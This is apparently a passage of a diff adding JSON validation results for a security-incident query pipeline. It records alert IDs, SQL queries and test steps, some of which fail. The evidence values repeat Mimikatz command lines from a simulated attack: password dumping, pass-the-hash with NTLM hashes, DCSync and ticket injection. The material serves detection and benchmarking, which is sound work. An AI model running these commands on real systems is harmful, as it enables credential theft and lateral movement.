+                "6880__2024-06-27t14:32:37.7041174z__\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\c$\\\"\" exit"
+              ]
+            },
+            {
+              "concept": "File_Name",
+              "graph_value": "get-krbticket.ps1",
+              "raw_components": {
+                "Name": "Get-KRBTicket.ps1"
+              },
+              "roles": [],
+              "entity_index": 21,
+              "alert_id": "52af3fc8-859f-3d1c-5435-312924f1dc16",
+              "time": "2024-07-18 22:36:02.468158+00:00",
+              "source_row_hash": "03262688d431df54a1fad9dd5f49b9c32fae0875119ff194281ecd14fe56eaac",
+              "matched_inputs": [
+                "6880__2024-06-27t14:32:37.7041174z__\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\c$\\\"\" exit"
+              ]
+            },
+            {
+              "concept": "File_Name",
+              "graph_value": "get-krbticket.ps1",
+              "raw_components": {
+                "Name": "Get-KRBTicket.ps1"
+              },
+              "roles": [],
+              "entity_index": 21,
+              "alert_id": "52af3fc8-859f-3d1c-5435-312924f1dc16",
+              "time": "2024-07-19 22:39:22.116411+00:00",
+              "source_row_hash": "071d155479edac0dc1db7946a9d74167c2cf33f845c0fefec78ec6638970c3cc",
+              "matched_inputs": [
+                "6880__2024-06-27t14:32:37.7041174z__\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\c$\\\"\" exit"
+              ]
+            }
+          ],
+          "witness_count": 27,
+          "sql": "SELECT DISTINCT o.AlertId, o.AlertTitle, o.ObservedAt, o.EntityIndex,\n       o.GraphValue AS value, o.RawComponents, o.Roles, o.SourceRowHash,\n       i.GraphValue AS matched_input\nFROM LTMInputEvidence i\nJOIN LTMEntityEvidence o ON o.SourceRowHash = i.SourceRowHash\nWHERE i.AlertTitle = %s\n  AND i.Concept = 'Process_Identity' AND o.Concept = 'File_Name'\n  AND i.GraphValue IN (%s,%s,%s,%s,%s,%s)\nORDER BY o.AlertId, o.SourceRowHash, o.EntityIndex, o.GraphValue, i.GraphValue\nLIMIT 501",
+          "parameters": [
+            "Suspicious access to LSASS service",
+            "4112__2024-06-27t14:32:36.6706405z__\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:kyleg /ntlm:96def1a633fc6790124d5f8fe31cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\c$\\\"\" exit",
+            "4748__2024-06-27t14:33:38.0249949z__\"mimikatz.exe\" \"lsadump::dcsync /domain:vnevado.alpineskihouse.co /user:xfbzkp\" exit",
+            "5176__2024-06-27t14:33:32.4282796z__\"mimikatz.exe\" privilege::debug \"kerberos::ptt c:\\m365dattack\\admin-tickets\" exit",
+            "5196__2024-06-27t14:32:35.4061023z__\"mimikatz.exe\" privilege::debug sekurlsa::logonpasswords exit",
+            "6880__2024-06-27t14:32:37.7041174z__\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\c$\\\"\" exit",
+            "7092__2024-06-27t14:32:46.4998999z__\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe c:\\m365dattack\\get-krbticket.ps1\\\"\" exit -wait"
+          ],
+          "error": null
+        }
+      ]
+    },
+    {
+      "variant": "route_db96e339d4c1b39d",
+      "seed_concept": "Process_Identity",
+      "passed": true,
+      "steps": [
+        {
+          "step": "T1",
+          "episode_id": "em_a5657604896b51cf",
+          "status": "ok",
+          "candidate_count": 324,
+          "unique_values": [
+            "4112__2024-06-27t14:32:36.6706405z__\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:kyleg /ntlm:96def1a633fc6790124d5f8fe31cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\c$\\\"\" exit",
+            "4748__2024-06-27t14:33:38.0249949z__\"mimikatz.exe\" \"lsadump::dcsync /domain:vnevado.alpineskihouse.co /user:xfbzkp\" exit",
+            "5176__2024-06-27t14:33:32.4282796z__\"mimikatz.exe\" privilege::debug \"kerberos::ptt c:\\m365dattack\\admin-tickets\" exit",
+            "5196__2024-06-27t14:32:35.4061023z__\"mimikatz.exe\" privilege::debug sekurlsa::logonpasswords exit",
+            "6880__2024-06-27t14:32:37.7041174z__\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\c$\\\"\" exit",
+            "7092__2024-06-27t14:32:46.4998999z__\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe c:\\m365dattack\\get-krbticket.ps1\\\"\" exit -wait"
+          ],
+          "expected_present": true,
+          "query_count": 1,
+          "expected_alert_id": "84b87469-5fb2-0d4a-fc55-f10f8bc78d9f",
+          "witnesses": [
+            {
+              "concept": "Process_Identity",
+              "graph_value": "6880__2024-06-27t14:32:37.7041174z__\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\c$\\\"\" exit",
+              "raw_components": {
+                "ProcessId": "6880",
+                "CommandLine": "\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\C$\\\"\" exit",
+                "CreatedTimeUtc": "2024-06-27T14:32:37.7041174Z"
+              },
+              "roles": [],
+              "entity_index": 14,
+              "alert_id": "84b87469-5fb2-0d4a-fc55-f10f8bc78d9f",
+              "time": "2024-07-21 22:40:00.985266+00:00",
+              "source_row_hash": "0abbf8ee8916ec4a03e3e866508d6f15635a587e0376ae368a66789a3fabda22",
+              "matched_inputs": [
+                "4748__2024-06-27t14:33:38.0249949z__\"mimikatz.exe\" \"lsadump::dcsync /domain:vnevado.alpineskihouse.co /user:xfbzkp\" exit"
+              ]
+            },
+            {
+              "concept": "Process_Identity",
+              "graph_value": "6880__2024-06-27t14:32:37.7041174z__\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\c$\\\"\" exit",
+              "raw_components": {
+                "ProcessId": "6880",
+                "CommandLine": "\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\C$\\\"\" exit",
+                "CreatedTimeUtc": "2024-06-27T14:32:37.7041174Z"
+              },
+              "roles": [],
+              "entity_index": 14,
+              "alert_id": "84b87469-5fb2-0d4a-fc55-f10f8bc78d9f",
+              "time": "2024-07-21 22:40:00.985266+00:00",
+              "source_row_hash": "0abbf8ee8916ec4a03e3e866508d6f15635a587e0376ae368a66789a3fabda22",
+              "matched_inputs": [
+                "5176__2024-06-27t14:33:32.4282796z__\"mimikatz.exe\" privilege::debug \"kerberos::ptt c:\\m365dattack\\admin-tickets\" exit"
+              ]
+            },
+            {
+              "concept": "Process_Identity",
+              "graph_value": "6880__2024-06-27t14:32:37.7041174z__\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\c$\\\"\" exit",
+              "raw_components": {
+                "ProcessId": "6880",
+                "CommandLine": "\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\C$\\\"\" exit",
+                "CreatedTimeUtc": "2024-06-27T14:32:37.7041174Z"
+              },
+              "roles": [],
+              "entity_index": 14,
+              "alert_id": "84b87469-5fb2-0d4a-fc55-f10f8bc78d9f",
+              "time": "2024-07-23 22:34:45.720003+00:00",
+              "source_row_hash": "18697c72083e6898762e956714003ba7ae6d10125f42c5f5bcd4b38e47715101",
+              "matched_inputs": [
+                "4748__2024-06-27t14:33:38.0249949z__\"mimikatz.exe\" \"lsadump::dcsync /domain:vnevado.alpineskihouse.co /user:xfbzkp\" exit"
+              ]
+            }
+          ],
+          "witness_count": 54,
+          "sql": "SELECT DISTINCT o.AlertId, o.AlertTitle, o.ObservedAt, o.EntityIndex,\n       o.GraphValue AS value, o.RawComponents, o.Roles, o.SourceRowHash,\n       i.GraphValue AS matched_input\nFROM LTMInputEvidence i\nJOIN LTMEntityEvidence o ON o.SourceRowHash = i.SourceRowHash\nWHERE i.AlertTitle = %s\n  AND i.Concept = 'Process_Identity' AND o.Concept = 'Process_Identity'\n  AND i.GraphValue IN (%s,%s)\nORDER BY o.AlertId, o.SourceRowHash, o.EntityIndex, o.GraphValue, i.GraphValue\nLIMIT 501",
+          "parameters": [
+            "Mimikatz credential theft tool",
+            "4748__2024-06-27t14:33:38.0249949z__\"mimikatz.exe\" \"lsadump::dcsync /domain:vnevado.alpineskihouse.co /user:xfbzkp\" exit",
+            "5176__2024-06-27t14:33:32.4282796z__\"mimikatz.exe\" privilege::debug \"kerberos::ptt c:\\m365dattack\\admin-tickets\" exit"
+          ],
+          "error": null
+        },
+        {
+          "step": "T2",
+          "episode_id": "em_e70aeae96c2b61b0",
+          "status": "ok",
+          "candidate_count": 108,
+          "unique_values": [
+            "get-krbticket.ps1"
+          ],
+          "expected_present": true,
+          "query_count": 1,
+          "expected_alert_id": "52af3fc8-859f-3d1c-5435-312924f1dc16",
+          "witnesses": [
+            {
+              "concept": "File_Name",
+              "graph_value": "get-krbticket.ps1",
+              "raw_components": {
+                "Name": "Get-KRBTicket.ps1"
+              },
+              "roles": [],
+              "entity_index": 21,
+              "alert_id": "52af3fc8-859f-3d1c-5435-312924f1dc16",
+              "time": "2024-07-15 22:39:22.394304+00:00",
+              "source_row_hash": "02ea8cb1e706b48e229d65e876b89a048d5c57a69f6e0af1bb058e706a422ebc",
+              "matched_inputs": [
+                "6880__2024-06-27t14:32:37.7041174z__\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\c$\\\"\" exit"
+              ]
+            },
+            {
+              "concept": "File_Name",
+              "graph_value": "get-krbticket.ps1",
+              "raw_components": {
+                "Name": "Get-KRBTicket.ps1"
+              },
+              "roles": [],
+              "entity_index": 21,
+              "alert_id": "52af3fc8-859f-3d1c-5435-312924f1dc16",
+              "time": "2024-07-18 22:36:02.468158+00:00",
+              "source_row_hash": "03262688d431df54a1fad9dd5f49b9c32fae0875119ff194281ecd14fe56eaac",
+              "matched_inputs": [
+                "6880__2024-06-27t14:32:37.7041174z__\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\c$\\\"\" exit"
+              ]
+            },
+            {
+              "concept": "File_Name",
+              "graph_value": "get-krbticket.ps1",
+              "raw_components": {
+                "Name": "Get-KRBTicket.ps1"
+              },
+              "roles": [],
+              "entity_index": 21,
+              "alert_id": "52af3fc8-859f-3d1c-5435-312924f1dc16",
+              "time": "2024-07-19 22:39:22.116411+00:00",
+              "source_row_hash": "071d155479edac0dc1db7946a9d74167c2cf33f845c0fefec78ec6638970c3cc",
+              "matched_inputs": [
+                "6880__2024-06-27t14:32:37.7041174z__\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\c$\\\"\" exit"
+              ]
+            }
+          ],
+          "witness_count": 27,
+          "sql": "SELECT DISTINCT o.AlertId, o.AlertTitle, o.ObservedAt, o.EntityIndex,\n       o.GraphValue AS value, o.RawComponents, o.Roles, o.SourceRowHash,\n       i.GraphValue AS matched_input\nFROM LTMInputEvidence i\nJOIN LTMEntityEvidence o ON o.SourceRowHash = i.SourceRowHash\nWHERE i.AlertTitle = %s\n  AND i.Concept = 'Process_Identity' AND o.Concept = 'File_Name'\n  AND i.GraphValue IN (%s,%s,%s,%s,%s,%s)\nORDER BY o.AlertId, o.SourceRowHash, o.EntityIndex, o.GraphValue, i.GraphValue\nLIMIT 501",
+          "parameters": [
+            "Suspicious access to LSASS service",
+            "4112__2024-06-27t14:32:36.6706405z__\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:kyleg /ntlm:96def1a633fc6790124d5f8fe31cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\c$\\\"\" exit",
+            "4748__2024-06-27t14:33:38.0249949z__\"mimikatz.exe\" \"lsadump::dcsync /domain:vnevado.alpineskihouse.co /user:xfbzkp\" exit",
+            "5176__2024-06-27t14:33:32.4282796z__\"mimikatz.exe\" privilege::debug \"kerberos::ptt c:\\m365dattack\\admin-tickets\" exit",
+            "5196__2024-06-27t14:32:35.4061023z__\"mimikatz.exe\" privilege::debug sekurlsa::logonpasswords exit",
+            "6880__2024-06-27t14:32:37.7041174z__\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\c$\\\"\" exit",
+            "7092__2024-06-27t14:32:46.4998999z__\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe c:\\m365dattack\\get-krbticket.ps1\\\"\" exit -wait"
+          ],
+          "error": null
+        }
+      ]
+    }
+  ],
+  "offline_scope": "Uses official start entities; no intermediate or target value supplied to queries. Expected values checked only after results.",
+  "live_scope": "Exported merged PM/EM; session-local MySQL projection of original CSV, membership from SecurityIncident.AlertIds. Official graph supplies seed, expected path checked only AFTER full route execution.",
+  "delta": {
+    "sm": 0,
+    "em": 1,
+    "pm": 1
+  },
+  "live_validation_v1": [
+    {
+      "variant": "from_File_Name",
+      "passed": false,
+      "steps": [
+        {
+          "step": "T1",
+          "status": "invalid_json",
+          "candidate_count": 0,
+          "expected_present": false,
+          "error": "Invalid \\escape: line 1 column 28 (char 27)",
+          "alert_id": "84b87469-5fb2-0d4a-fc55-f10f8bc78d9f"
+        }
+      ]
+    },
+    {
+      "variant": "from_Process_Identity",
+      "passed": false,
+      "steps": [
+        {
+          "step": "T1",
+          "status": "invalid_json",
+          "candidate_count": 0,
+          "expected_present": false,
+          "error": "Invalid \\escape: line 1 column 28 (char 27)",
+          "alert_id": "84b87469-5fb2-0d4a-fc55-f10f8bc78d9f"
+        }
+      ]
+    }
+  ],
+  "physical_revision": 2,
+  "verification": "exact_alert_and_edge_lineage"
+}
